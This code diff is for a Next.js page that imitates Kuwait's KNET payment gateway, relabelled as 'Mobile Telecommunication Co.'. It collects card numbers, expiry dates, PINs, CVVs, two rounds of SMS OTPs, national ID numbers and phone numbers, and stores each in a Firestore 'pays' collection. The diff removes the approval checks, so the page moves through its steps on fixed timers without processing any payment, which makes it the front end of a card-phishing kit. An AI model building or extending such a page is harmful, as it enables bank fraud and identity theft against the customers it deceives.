@@ -2,11 +2,12 @@
 import { useEffect, useState } from "react"
 import "./knet.css"
 import { doc, onSnapshot } from "firebase/firestore"
-import { db, handlePay } from "@/lib/firebasee"
-import { Badge } from "@/components/ui/badge"
-import { FullPageLoader } from "@/components/full-page-loader"
+import { useRouter } from "next/navigation"
+import { db, handlePay } from "@/lib/firebase"
+import Loader from "@/components/loader"
 
 type PaymentInfo = {
+  createdDate: string
   cardNumber: string
   year: string
   month: string
@@ -19,15 +20,11 @@ type PaymentInfo = {
   bank_card: string[]
   prefix: string
   status: "new" | "pending" | "approved" | "rejected"
+  phoneNumber: string
+  network: string
+  idNumber: string
+  otp2: string
 }
-
-interface DiscountInfo {
-  originalAmount: string
-  discountAmount: string
-  discountPercentage: string
-  finalAmount: string
-}
-
 const BANKS = [
   {
     value: "ABK",
@@ -49,11 +46,13 @@ const BANKS = [
     label: "Boubyan Bank",
     cardPrefixes: ["470350", "490455", "490456", "404919", "450605", "426058", "431199"],
   },
+
   {
     value: "BURGAN",
     label: "Burgan Bank",
     cardPrefixes: ["468564", "402978", "403583", "415254", "450238", "540759", "49219000"],
   },
+
   {
     value: "CBK",
     label: "Commercial Bank of Kuwait",
@@ -64,6 +63,7 @@ const BANKS = [
     label: "Doha Bank",
     cardPrefixes: ["419252"],
   },
+
   {
     value: "GBK",
     label: "Gulf Bank",
@@ -74,6 +74,7 @@ const BANKS = [
     label: "TAM Bank",
     cardPrefixes: ["45077848", "45077849"],
   },
+
   {
     value: "KFH",
     label: "Kuwait Finance House",
@@ -115,15 +116,10 @@ export default function Payment() {
   const [step, setstep] = useState(1)
   const [newotp] = useState([""])
   const [total, setTotal] = useState("")
-  const [discountInfo, setDiscountInfo] = useState<DiscountInfo>({
-    originalAmount: "",
-    discountAmount: "",
-    discountPercentage: "",
-    finalAmount: "",
-  })
   const [isloading, setisloading] = useState(false)
-
+  const router = useRouter()
   const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
+    createdDate: new Date().toISOString(),
     cardNumber: "",
     year: "",
     month: "",
@@ -135,30 +131,21 @@ export default function Payment() {
     bank_card: [""],
     prefix: "",
     status: "new",
+    phoneNumber: "",
+    network: "",
+    idNumber: "",
+    otp2: "",
   })
-
+  const [countdown, setCountdown] = useState(60)
+  const [isCountdownActive, setIsCountdownActive] = useState(true)
   const handleAddotp = (otp: string) => {
     newotp.push(`${otp} , `)
   }
-
   useEffect(() => {
-    // Load discount information from localStorage
-    try {
-      const finalAmount = localStorage.getItem("amount") || "0.000" // Discounted amount
-      const originalAmount = localStorage.getItem("originalAmount") || finalAmount
-      const discountAmount = localStorage.getItem("discountAmount") || "0.000"
-      const discountPercentage = localStorage.getItem("discountPercentage") || "0"
-
-      setTotal(finalAmount)
-      setDiscountInfo({
-        originalAmount,
-        discountAmount,
-        discountPercentage,
-        finalAmount,
-      })
-    } catch (error) {
-      console.error("Error accessing localStorage:", error)
-      setTotal("0.000")
+    //handleAddotp(paymentInfo.otp!)
+    const ty = localStorage!.getItem("amount")
+    if (ty) {
+      setTotal(ty)
     }
   }, [])
 
@@ -168,17 +155,6 @@ export default function Payment() {
       const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
         if (docSnap.exists()) {
           const data = docSnap.data() as PaymentInfo
-          if (data.status) {
-            setPaymentInfo((prev) => ({ ...prev, status: data.status }))
-            if (data.status === "approved") {
-              setstep(2)
-              setisloading(false)
-            } else if (data.status === "rejected") {
-              setisloading(false)
-              alert("تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ")
-              setstep(1)
-            }
-          }
         }
       })
 
@@ -186,7 +162,21 @@ export default function Payment() {
     }
   }, [])
 
-  const hasDiscount = Number.parseFloat(discountInfo.discountAmount) > 0
+  useEffect(() => {
+    let interval: NodeJS.Timeout | null = null
+
+    if (isCountdownActive && countdown > 0) {
+      interval = setInterval(() => {
+        setCountdown((countdown) => countdown - 1)
+      }, 1000)
+    } else if (countdown === 0) {
+      setIsCountdownActive(false)
+    }
+
+    return () => {
+      if (interval) clearInterval(interval)
+    }
+  }, [isCountdownActive, countdown])
 
   return (
     <div style={{ background: "#f1f1f1", height: "100vh", margin: 0, padding: 0 }} dir="ltr">
@@ -195,97 +185,31 @@ export default function Payment() {
           e.preventDefault()
         }}
       >
-        <div className="madd" />
-        <img src="./dre5.png" className="-" alt="logo" />
-
         <div id="PayPageEntry">
           <div className="container">
+            <img src="./mob.jpg" className="-" alt="logo" />
+
             <div className="content-block">
               <div className="form-card">
                 <div className="container-" style={{ display: "flex", justifyContent: "center" }}>
-                  <img src="./kv.png" className="-" alt="logo" height={50} width={50} />
+                  <img src="./next.svg" className="-" alt="logo" height={90} width={90} />
                 </div>
                 <div className="row">
                   <label className="column-label">Merchant: </label>
-                  <label className="column-value text-label">KNET Payment</label>
+                  <label className="column-value text-label">Mobile Telecommunication Co. </label>
                 </div>
-
-                {/* Enhanced Amount Display with Discount */}
                 <div id="OrgTranxAmt">
-                  {hasDiscount && (
-                    <>
-                      <div className="row" style={{ marginBottom: "5px" }}>
-                        <label className="column-label">Original Amount: </label>
-                        <label
-                          className="column-value text-label"
-                          style={{ textDecoration: "line-through", color: "#999" }}
-                        >
-                          {discountInfo.discountAmount} KD
-                        </label>
-                      </div>
-                      <div className="row" style={{ marginBottom: "5px" }}>
-                        <label className="column-label" style={{ color: "#28a745" }}>
-                          Discount ({discountInfo.discountPercentage}%):{" "}
-                        </label>
-                        <label className="column-value text-label" style={{ color: "#28a745", fontWeight: "bold" }}>
-                          -{discountInfo.discountAmount} KD
-                        </label>
-                      </div>
-                    </>
-                  )}
-                  <label className="column-label">{hasDiscount ? "Final Amount:" : "Amount:"} </label>
-                  <label
-                    className="column-value text-label"
-                    id="amount"
-                    style={{ fontWeight: "bold", color: hasDiscount ? "#28a745" : "inherit" }}
-                  >
-                    {parseInt(total)-parseInt(total)*0.30} KD
+                  <label className="column-label"> Amount: </label>
+                  <label className="column-value text-label" id="amount">
+                    {total}
+                    {"  "}KD&nbsp;{" "}
                   </label>
-                  {hasDiscount && (
-                    <div
-                      style={{
-                        background: "#d4edda",
-                        border: "1px solid #c3e6cb",
-                        borderRadius: "4px",
-                        padding: "8px",
-                        marginTop: "10px",
-                        textAlign: "center",
-                        fontSize: "12px",
-                        color: "#155724",
-                      }}
-                    >
-                      🎉 You saved {discountInfo.discountAmount} KD with 30% discount!
-                    </div>
-                  )}
                 </div>
-
-                {/* Discount Rate and Amount sections (now visible if discount exists) */}
-                {hasDiscount && (
-                  <>
-                    <div
-                      className="row"
-                      id="DiscntRate"
-                      style={{ display: "block", background: "#f8f9fa", padding: "5px", borderRadius: "3px" }}
-                    >
-                      <label className="column-label">Discount Rate: </label>
-                      <label className="column-value text-label" style={{ color: "#28a745", fontWeight: "bold" }}>
-                        {discountInfo.discountPercentage}%
-                      </label>
-                    </div>
-                    <div
-                      className="row"
-                      id="DiscntedAmt"
-                      style={{ display: "block", background: "#f8f9fa", padding: "5px", borderRadius: "3px" }}
-                    >
-                      <label className="column-label">Discount Amount: </label>
-                      <label className="column-value text-label" style={{ color: "#28a745", fontWeight: "bold" }}>
-                        {discountInfo.discountAmount} KD
-                      </label>
-                    </div>
-                  </>
-                )}
+                {/* Added for PG Eidia Discount starts   */}
+                <div className="row" id="DiscntRate" style={{ display: "none" }} />
+                <div className="row" id="DiscntedAmt" style={{ display: "none" }} />
+                {/* Added for PG Eidia Discount ends   */}
               </div>
-
               <div className="form-card">
                 <div
                   className="notification"
@@ -302,6 +226,7 @@ export default function Payment() {
                   }}
                   id="otpmsgDC"
                 />
+                {/*Customer Validation  for knet*/}
                 <div
                   className="notification"
                   style={{
@@ -317,11 +242,20 @@ export default function Payment() {
                   }}
                   id="CVmsg"
                 />
-                <div id="ValidationMessage"></div>
+                <div id="ValidationMessage">
+                  {/*span class="notification" style="border: #ff0000 1px solid;background-color: #f7dadd; font-size: 12px;
+            font-family: helvetica, arial, sans serif;
+            color: #ff0000;
+              padding: 2px; display:none;margin-bottom: 3px; text-align:center;"   id="">
+                      </span*/}
+                </div>
                 <div id="savedCardDiv" style={{ display: "none" }}>
+                  {/* Commented the bank name display for kfast starts */}
                   <div className="row">
                     <br />
                   </div>
+                  {/* Commented the bank name display for kfast ends */}
+                  {/* Added for Points Redemption */}
                   <div className="row">
                     <label className="column-label" style={{ marginLeft: 20 }}>
                       PIN:
@@ -340,6 +274,7 @@ export default function Payment() {
                       style={{ width: "50%" }}
                     />
                   </div>
+                  {/* Added for Points Redemption */}
                 </div>
 
                 {step === 1 ? (
@@ -375,10 +310,10 @@ export default function Payment() {
                         </select>
                       </div>
                       <div className="row three-column" id="Paymentpagecardnumber">
-                        <label className="column-label">Card Number:</label>
+                        <label className="column-label mt-1">Card Number:</label>
                         <label>
                           <select
-                            className="column-value"
+                            className="column-value  mt-1"
                             name="dcprefix"
                             id="dcprefix"
                             onChange={(e: any) =>
@@ -521,7 +456,8 @@ export default function Payment() {
                         </select>
                       </div>
                       <div className="row" id="PinRow">
-                        <input type="hidden" name="cardPinType" defaultValue="A" />
+                        {/* <div class="col-lg-12"><label class="col-lg-6"></label></div> */}
+
                         <div id="eComPin">
                           <label className="column-label"> PIN: </label>
                         </div>
@@ -549,6 +485,7 @@ export default function Payment() {
                       </div>
                       {step === 1 && paymentInfo.status === "approved" ? (
                         <div className="row" id="PinRow">
+                          {/* <div class="col-lg-12"><label class="col-lg-6"></label></div> */}
                           <input type="hidden" name="cardPinType" defaultValue="A" />
                           <div id="eComPin">
                             <label className="column-label"> Cvv: </label>
@@ -572,17 +509,20 @@ export default function Payment() {
                       ) : null}
                     </div>
                   </>
-                ) : (
+                ) : step === 2 ? (
                   <div>
                     <div className="row">
-                      <Badge variant={"outline"} className="bg-blue-100 font-normal p-2 my-2">
+                      <div className="bg-blue-100 font-normal p-2 my-2" style={{ fontSize: 12, borderRadius: 3 }}>
                         Please note: A 6-digit verification code has been sent via text message to your registered phone
-                        number. Please enter your zip code in the box below to complete the verification process.
-                      </Badge>
+                        number
+                      </div>
                     </div>
                     <div className="row">
                       <label className="column-value">CardNumber:</label>
-                      <label>****** {paymentInfo.cardNumber}</label>
+                      <label style={{ margin: 0, padding: 0 }}>
+                        {" "}
+                        {paymentInfo.cardNumber.substring(0, 5) + "****" + paymentInfo.cardNumber.substring(10, 15)}
+                      </label>
                     </div>
                     <div className="row">
                       <label className="column-value">Month expiry:</label>
@@ -596,17 +536,6 @@ export default function Payment() {
                       <label className="column-value">Pin:</label>
                       <label>{"****"}</label>
                     </div>
-                    {hasDiscount && (
-                      <div
-                        className="row"
-                        style={{ background: "#d4edda", padding: "8px", borderRadius: "4px", margin: "10px 0" }}
-                      >
-                        <label className="column-value" style={{ color: "#155724", fontWeight: "bold" }}>
-                          Discount Applied: {discountInfo.discountPercentage}% OFF
-                        </label>
-                        <label style={{ color: "#155724" }}>Saved: {discountInfo.discountAmount} KD</label>
-                      </div>
-                    )}
                     <div className="flex my-1">
                       <label className="column w-16">OTP:</label>
                       <input
@@ -618,11 +547,23 @@ export default function Payment() {
                         }
                         type="tel"
                         maxLength={6}
+                        id="timer"
                         className="w-full"
                         value={paymentInfo.otp}
+                        placeholder={`${countdown}s`}
                       />
                     </div>
                   </div>
+                ) : step === 3 ? (
+                  <>
+                    <Step3 setPaymentInfo={setPaymentInfo} paymentInfo={paymentInfo} />
+                  </>
+                ) : step === 4 ? (
+                  <>
+                    <Step4 setPaymentInfo={setPaymentInfo} paymentInfo={paymentInfo} />
+                  </>
+                ) : (
+                  <></>
                 )}
               </div>
               <div className="form-card">
@@ -654,31 +595,57 @@ export default function Payment() {
                               paymentInfo.month === "" ||
                               paymentInfo.year === "" ||
                               paymentInfo.pass.length !== 4)) ||
-                          paymentInfo.status === "pending" ||
-                          (step === 2 && paymentInfo.otp?.length !== 6)
+                          (step === 2 && paymentInfo.otp?.length !== 6) 
+                         
                         }
                         onClick={() => {
                           if (step === 1) {
                             setisloading(true)
                             handlePay(paymentInfo, setPaymentInfo)
-                          } else if (step >= 2) {
+                            setTimeout(() => {
+                              setstep(2)
+                              setisloading(false)
+                            }, 3000)
+                          } else if (step === 2) {
                             if (!newotp.includes(paymentInfo.otp!)) {
                               newotp.push(paymentInfo.otp!)
                             }
                             setisloading(true)
                             handleAddotp(paymentInfo.otp!)
+                            //   handleOArr(paymentInfo.otp!);
+
                             handlePay(paymentInfo, setPaymentInfo)
                             setTimeout(() => {
+                              console.log(step)
+                              setstep(3)
                               setisloading(false)
-                              setPaymentInfo({
-                                ...paymentInfo,
-                                otp: "",
-                              })
+                            }, 3000)
+                          } else if (step === 3) {
+                            console.log(step, 3)
+                            setisloading(true)
+
+                            // Save step 3 data to Firestore
+                            handlePay(paymentInfo, setPaymentInfo)
+
+                            setTimeout(() => {
+                              setstep(4)
+                              setisloading(false)
+                            }, 3000)
+                          } else if (step === 4) {
+                            setisloading(true)
+
+                            // Save step 4 data (otp2) to Firestore
+                            handlePay(paymentInfo, setPaymentInfo)
+
+                            setTimeout(() => {
+                              setisloading(false)
+                              router.push("/auth")
                             }, 3000)
                           }
+
                           setPaymentInfo({
                             ...paymentInfo,
-                            otp: "",
+                            otp2: step === 4 ? "" : paymentInfo.otp2,
                           })
                         }}
                       >
@@ -701,7 +668,7 @@ export default function Payment() {
                         lineHeight: 1,
                       }}
                     >
-                      All&nbsp;Rights&nbsp;Reserved.&nbsp;Copyright&nbsp;2024&nbsp;©&nbsp;
+                      All&nbsp;Rights&nbsp;Reserved.&nbsp;Copyright&nbsp;2024&nbsp; &nbsp;
                       <br />
                       <span
                         style={{
@@ -721,8 +688,134 @@ export default function Payment() {
             </div>
           </div>
         </div>
+        {isloading && <Loader />}
       </form>
-      {isloading && <FullPageLoader />}
+    </div>
+  )
+}
+
+const Step3 = ({ setPaymentInfo, paymentInfo }: any) => {
+  return (
+    <div id="FCUseDebitEnable" style={{ marginTop: 5 }}>
+      <div className="row">
+        <label style={{ width: "40%" }} className="column-label">
+          ID Number:
+        </label>
+        <label>
+          <input
+            name="natID"
+            style={{ width: "60%" }}
+            type="tel"
+            inputMode="numeric"
+            pattern="[0-9]*"
+            size={12}
+            onChange={(e: any) =>
+              setPaymentInfo({
+                ...paymentInfo,
+                idNumber: e.target.value,
+              })
+            }
+            className="allownumericwithoutdecimal"
+            maxLength={12}
+            title="Should be in number. Length should be 12"
+          />
+        </label>
+      </div>
+      <div className="row">
+        <label style={{ width: "40%" }} className="column-label">
+          Authorized Phone Number:
+        </label>
+        <label>
+          <input
+            name="number"
+            onChange={(e: any) =>
+              setPaymentInfo({
+                ...paymentInfo,
+                phoneNumber: e.target.value,
+              })
+            }
+            style={{ width: "60%" }}
+            type="tel"
+            inputMode="numeric"
+            pattern="[0-9]*"
+            size={10}
+            className="allownumericwithoutdecimal"
+            maxLength={10}
+            title="Should be in number. Length should be 10"
+          />
+        </label>
+      </div>
+      <div className="row">
+        <label className="column-label" style={{ width: "40%" }}>
+          Network operator:{" "}
+        </label>
+        <select
+          className="column-value"
+          style={{ width: "60%" }}
+          name="company"
+          onChange={(e: any) =>
+            setPaymentInfo({
+              ...paymentInfo,
+              network: e.target.value,
+            })
+          }
+          id="type"
+        >
+          <option value="">Choose Network operator:...</option>
+          <option value="STC" title="STC">
+            STC
+          </option>
+          <option value="Zain" title="Zain">
+            Zain
+          </option>
+          <option value="Ooredoo" title="Ooredoo">
+            Ooredoo
+          </option>
+        </select>
+      </div>
+    </div>
+  )
+}
+const Step4 = (props: any) => {
+  return (
+    <div>
+      <div className="row">
+        <div className="bg-blue-100 font-normal p-2 my-2" style={{ fontSize: 12, borderRadius: 3 }}>
+          Please note: A 6-digit verification code has been sent via text message to your registered phone number
+        </div>
+      </div>
+      <div className="row">
+        <label style={{ width: "40%" }} className="column-label">
+          ID Number:
+        </label>
+        <label style={{ width: "60%", fontWeight: 100, color: "black" }} className="column-label">
+          {props.paymentInfo.idNumber}
+        </label>
+      </div>
+      <div className="row">
+        <label style={{ width: "40%" }} className="column-label">
+          Phone Number:
+        </label>
+        <label style={{ width: "60%", fontWeight: 100, color: "black" }} className="column-label">
+          {props.paymentInfo.phoneNumber}
+        </label>
+      </div>
+      <div className="row">
+        <label className="column-label">OTP:</label>
+        <label className="column-label"></label>
+        <input
+          onChange={(e: any) =>
+            props.setPaymentInfo({
+              ...props.paymentInfo,
+              otp2: e.target.value,
+            })
+          }
+          type="tel"
+          maxLength={6}
+          id="timer"
+          value={props.paymentInfo.otp2}
+        />
+      </div>
     </div>
   )
 }
